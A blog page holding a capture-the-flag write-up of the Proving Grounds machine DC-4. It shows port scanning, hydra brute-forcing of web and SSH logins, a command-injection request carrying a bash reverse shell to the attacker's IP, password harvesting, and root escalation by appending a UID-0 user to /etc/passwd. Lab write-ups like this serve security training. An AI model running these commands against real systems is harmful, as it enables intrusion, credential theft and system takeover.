<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 08/10/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: DC-4
A double edged sword
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/pg/dc-4/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="Proving Grounds - DC-4"><meta property="og:description" content="ðŸ“† 08/10/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: DC-4
A double edged sword
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/pg/dc-4/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="Proving Grounds - DC-4"><meta name=twitter:description content="ðŸ“† 08/10/2022 - geobour98 âŒš 7 min
Introduction This is a Proving Grounds room which can be found at: DC-4
A double edged sword
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"Proving Grounds - DC-4","item":"https://geobour98.com/write-ups/pg/dc-4/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Proving Grounds - DC-4","name":"Proving Grounds - DC-4","description":"ðŸ“† 08/10/2022 - geobour98 âŒš 7 min\nIntroduction This is a Proving Grounds room which can be found at: DC-4\nA double edged sword\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0.","keywords":[],"articleBody":"ðŸ“† 08/10/2022 - geobour98 âŒš 7 min\nIntroduction This is a Proving Grounds room which can be found at: DC-4\nA double edged sword\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:48 Completed Parallel DNS resolution of 1 host. at 19:48, 0.00s elapsed Initiating Connect Scan at 19:48 Scanning 192.168.142.195 (192.168.142.195) [65535 ports] Discovered open port 22/tcp on 192.168.142.195 Discovered open port 80/tcp on 192.168.142.195 Completed Connect Scan at 19:49, 18.93s elapsed (65535 total ports) Nmap scan report for 192.168.142.195 (192.168.142.195) Host is up (0.053s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 19.03 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.142.195  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:50 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating Ping Scan at 19:50 Scanning 192.168.142.195 [4 ports] Completed Ping Scan at 19:50, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:50 Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed Initiating SYN Stealth Scan at 19:50 Scanning 192.168.142.195 (192.168.142.195) [2 ports] Discovered open port 22/tcp on 192.168.142.195 Discovered open port 80/tcp on 192.168.142.195 Completed SYN Stealth Scan at 19:50, 0.09s elapsed (2 total ports) Initiating Service scan at 19:50 Scanning 2 services on 192.168.142.195 (192.168.142.195) Completed Service scan at 19:50, 6.15s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.142.195 (192.168.142.195) Retrying OS detection (try #2) against 192.168.142.195 (192.168.142.195) Initiating Traceroute at 19:50 Completed Traceroute at 19:50, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 19:50 Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed NSE: Script scanning 192.168.142.195. Initiating NSE at 19:50 Completed NSE at 19:50, 1.75s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.22s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Nmap scan report for 192.168.142.195 (192.168.142.195) Host is up (0.057s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA) | 256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA) |_ 256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519) 80/tcp open http nginx 1.15.10 |_http-server-header: nginx/1.15.10 | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: System Tools Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 3.13 (91%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 3.12 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 198.841 days (since Sun Mar 13 22:39:35 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 69.20 ms 192.168.49.1 (192.168.49.1) 2 69.37 ms 192.168.142.195 (192.168.142.195)  NSE: Script Post-scanning. Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Initiating NSE at 19:50 Completed NSE at 19:50, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 36 (2.896KB) Brute force the website for directories and files with the extension .php using gobuster.\n  Command: gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50  geobour98@kali:~$ gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.142.195/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/09/28 19:53:20 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 302) [Size: 206] [-- index.php] /images (Status: 301) [Size: 170] [-- http://192.168.142.195/images/] /index.php (Status: 200) [Size: 506] /css (Status: 301) [Size: 170] [-- http://192.168.142.195/css/] /logout.php (Status: 302) [Size: 163] [-- index.php] /command.php (Status: 302) [Size: 704] [-- index.php]  =============================================================== 2022/09/28 20:01:23 Finished =============================================================== Exploitation The most interesting file is command.php but leads to index.php, so maybe we have to be authenticated in order to view it. Now we brute force the admin user using hydra and if the success message contains the word command, then we have successfully brute forced the password.\n  Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form \"/login.php:username=^USER^\u0026password=^PASS^:S=command\"  geobour98@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form \"/login.php:username=^USER^\u0026password=^PASS^:S=command\" Hydra v9.3 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 19:54:50 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://192.168.142.195:80/login.php:username=^USER^\u0026password=^PASS^:S=command [80][http-post-form] host: 192.168.142.195 login: admin password: [REDACTED] 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 19:55:10 Now we can login with username admin and the found password, and navigate to /command.php. Here we can execute some commands from the UI, but if we Intercept a request with Burp Suite, we see it is a POST request with a parameter radio, which executes linux commands. So we can put there a bash reverse shell like the following: bash -c 'exec bash -i \u0026/dev/tcp/192.168.49.117/443 , but we have to URL-encode it first. The request in Burp Suite should look like this:\nPOST /command.php HTTP/1.1 Host: 192.168.142.195 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 77 Origin: http://192.168.142.195 Connection: close Referer: http://192.168.142.195/command.php Cookie: PHPSESSID=h8dn71jf3jkrrdgnd7u0a525f6 Upgrade-Insecure-Requests: 1  radio=bash+-c+'exec+bash+-i+%26/dev/tcp/192.168.49.142/443+\u0026submit=Run Open a netcat listener and we get a reverse shell as www-data.\nlistening on [any] 443 ... connect to [192.168.49.142] from (UNKNOWN) [192.168.142.195] 53996 bash: cannot set terminal process group (541): Inappropriate ioctl for device bash: no job control in this shell www-data@dc-4:/usr/share/nginx/html$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@dc-4:/usr/share/nginx/html$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@dc-4:/usr/share/nginx/html$ export TERM=xterm-256color www-data@dc-4:/usr/share/nginx/html$ stty rows 38 cols 111 www-data@dc-4:/usr/share/nginx/html$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Navigate to /home/jim and we see local.txt. Also, we see an interesting folder backups, which contains the file old-passwords.bak.\nwww-data@dc-4:/home/jim$ cat local.txt [REDACTED] www-data@dc-4:/home/jim$ cd backups www-data@dc-4:/home/jim/backups$ ls old-passwords.bak Then, transfer old-passwords.bak to the attacker machine and brute force the user jim with the found wordlist. We will use hydra again.\n  Command: hydra -l jim -P old-passwords.bak ssh://192.168.142.195  geobour98@kali:~$ hydra -l jim -P old-passwords.bak ssh://192.168.142.195 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 20:05:55 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task [DATA] attacking ssh://192.168.142.195:22/ [STATUS] 146.00 tries/min, 146 tries in 00:01h, 109 to do in 00:01h, 13 active [STATUS] 105.50 tries/min, 211 tries in 00:02h, 44 to do in 00:01h, 13 active [22][ssh] host: 192.168.142.195 login: jim password: [REDACTED] 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 3 final worker threads did not complete until end. Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 20:08:10 Now we can login with SSH as the user jim with the found password.\ngeobour98@kali:~$ ssh jim@192.168.142.195 The authenticity of host '192.168.142.195 (192.168.142.195)' can't be established. ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '192.168.142.195' (ED25519) to the list of known hosts. jim@192.168.142.195's password: Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. You have mail. Last login: Sun Apr 7 02:23:55 2019 from 192.168.0.100 jim@dc-4:~$ Then, we run find command to find files owned by jim. The most interesting is /var/mail/jim, which contains the password of user charles. So, we switch to that user.\njim@dc-4:~$ find / -type f -user jim 2/dev/null [REDACTED] /var/mail/jim [REDACTED] jim@dc-4:~$ cat /var/mail/jim [REDACTED] Hi Jim,  I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anyt hing goes wrong.  Password is: [REDACTED]  See ya, Charles [REDACTED] jim@dc-4:~$ su charles Password: charles@dc-4:/home/jim$ id uid=1001(charles) gid=1001(charles) groups=1001(charles) Privilege Escalation After executing the command: sudo -l we see that we can execute /usr/bin/teehee as root. If we run strings command on /usr/bin/teehee we will find the help menu of that binary. Then we can execute it with the -a option to append a new user with both GID and UID as 0 (as root) at /etc/passwd. Before running /usr/bin/teehee we must generate a hash of a password (geobour98 in my case) with openssl in order to put it in /etc/passwd.\ncharles@dc-4:~$ sudo -l Matching Defaults entries for charles on dc-4:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User charles may run the following commands on dc-4:  (root) NOPASSWD: /usr/bin/teehee charles@dc-4:~$ strings /usr/bin/teehee [REDACTED] Try '%s --help' for more information. Usage: %s [OPTION]... [FILE]... Copy standard input to each FILE, and also to standard output.  -a, --append append to the given FILEs, do not overwrite  -i, --ignore-interrupts ignore interrupt signals  -p diagnose errors writing to non pipes  --output-error[=MODE] set behavior on write error. See MODE below  --help display this help and exit  --version output version information and exit MODE determines behavior with write errors on the outputs:  'warn' diagnose errors writing to any output  'warn-nopipe' diagnose errors writing to any output not a pipe  'exit' exit on error writing to any output  'exit-nopipe' exit on error writing to any output not a pipe [REDACTED] charles@dc-4:~$ openssl passwd geobour98 Warning: truncating password to 8 characters GWIOrZOActC.A charles@dc-4:~$ sudo /usr/bin/teehee -a /etc/passwd geobour98:GWIOrZOActC.A:0:0:::/bin/bash geobour98:GWIOrZOActC.A:0:0:::/bin/bash ^C charles@dc-4:~$ cat /etc/passwd [REDACTED] geobour98:GWIOrZOActC.A:0:0:::/bin/bash [REDACTED] charles@dc-4:~$ su geobour98 Password: root@dc-4:/home/charles# id uid=0(root) gid=0(root) groups=0(root) root@dc-4:/home/charles# cat /root/proof.txt [REDACTED] Proof of Concept (PoC image): linux web php hydra ssh sudo teehee openssl  ","wordCount":"1857","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/pg/dc-4/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Proving Grounds - DC-4</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 08/10/2022 - geobour98<br>âŒš 7 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>Proving Grounds</strong> room which can be found at:
<a href=https://portal.offensive-security.com/labs/play target=_blank style=color:#e30f0f>DC-4</a></p><p>A double edged sword</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 192.168.142.195</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-28 19:48 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 19:48
</span></span><span style=display:flex><span>Scanning 192.168.142.195 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 19:48, 0.05s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:48
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:48, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 19:48
</span></span><span style=display:flex><span>Scanning 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.142.195
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.142.195
</span></span><span style=display:flex><span>Completed Connect Scan at 19:49, 18.93s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.053s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 19.03 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80 -v 192.168.142.195</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.142.195
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-28 19:50 EEST
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at 19:50
</span></span><span style=display:flex><span>Scanning 192.168.142.195 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 19:50, 0.09s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:50
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 19:50
</span></span><span style=display:flex><span>Scanning 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 192.168.142.195
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 192.168.142.195
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 19:50, 0.09s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 19:50
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 19:50, 6.15s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 192.168.142.195 (192.168.142.195)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 192.168.142.195 (192.168.142.195)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 19:50
</span></span><span style=display:flex><span>Completed Traceroute at 19:50, 0.07s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:50
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 192.168.142.195.
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 1.75s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.22s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.057s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.15.10
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.15.10
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST
</span></span><span style=display:flex><span>|_http-title: System Tools
